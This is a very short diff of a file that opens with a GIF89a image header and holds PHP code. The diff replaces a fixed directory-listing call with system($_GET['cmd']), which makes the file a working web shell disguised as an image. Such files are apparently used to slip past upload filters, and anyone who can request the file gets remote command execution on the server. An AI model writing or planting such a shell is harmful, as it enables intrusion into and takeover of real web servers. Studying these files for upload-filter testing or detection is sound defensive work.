@@ -1,3 +1,5 @@
 GIF89a; 
-<?php system('ls-l /'); ?>
+<?php 
+system($_GET['cmd']); 
+?>
 
